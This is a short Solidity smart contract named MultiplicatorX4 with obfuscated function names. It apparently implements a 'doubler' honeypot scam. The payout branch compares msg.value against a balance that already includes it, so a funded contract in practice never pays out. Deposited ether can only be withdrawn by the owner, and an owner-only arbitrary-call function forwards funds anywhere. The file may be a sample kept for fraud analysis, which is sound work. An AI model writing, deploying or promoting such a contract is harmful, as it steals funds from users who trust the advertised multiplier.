// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract MultiplicatorX4
{
    address public Owner = msg.sender;

    function() public payable{}

    function _0x90fc1a()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address _0x10c4f1,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        _0x10c4f1.call.value(msg.value)(data);
    }

    function _0x540c32(address _0x10c4f1)
    public
    payable
    {
        if(msg.value>=this.balance)
        {
            _0x10c4f1.transfer(this.balance+msg.value);
        }
    }
}